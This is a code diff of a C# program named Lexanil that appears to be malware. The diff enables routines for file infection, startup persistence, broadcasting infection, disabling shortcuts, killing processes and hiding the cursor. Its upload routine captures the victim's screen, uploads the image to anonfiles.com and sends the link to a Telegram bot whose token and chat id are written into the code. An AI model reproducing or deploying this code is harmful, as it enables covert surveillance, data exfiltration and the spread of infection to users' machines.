@@ -43,14 +43,13 @@ namespace Lexanil
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
-            CaptureScreen();
             uploadFileAndNotify();
-            //broadcastInfection(); 
-            //disableShortcuts();
-            //ShowCursor(false);
-            //startupInfect();
-            //infectFiles();
-            //prockilltmr.Start();
+            broadcastInfection(); 
+            disableShortcuts();
+            prockilltmr.Start();
+            ShowCursor(false);
+            startupInfect();
+            infectFiles();
         }
 
         private void prockilltmr_Tick(object sender, EventArgs e)
@@ -232,12 +231,13 @@ namespace Lexanil
         {
             using (WebClient client = new WebClient())
             {
+                CaptureScreen();
                 byte[] responseArray = client.UploadFile("https://api.anonfiles.com/upload", Paths.ScreenShots + ".jpeg");
                 var response = System.Text.Encoding.ASCII.GetString(responseArray).ToString();
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text={response}");
+                var match = Regex.Match(response,  @"\w+://\w+.\w+/\w+/screencap-\d+_\w+").ToString();
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text={match}");
                 HttpWebResponse response2 = (HttpWebResponse)request.GetResponse();
-                Stream resStream = response2.GetResponseStream();
-                // JSON PARSE
+                Stream resStream = response2.GetResponseStream(); 
             }
         }
     }
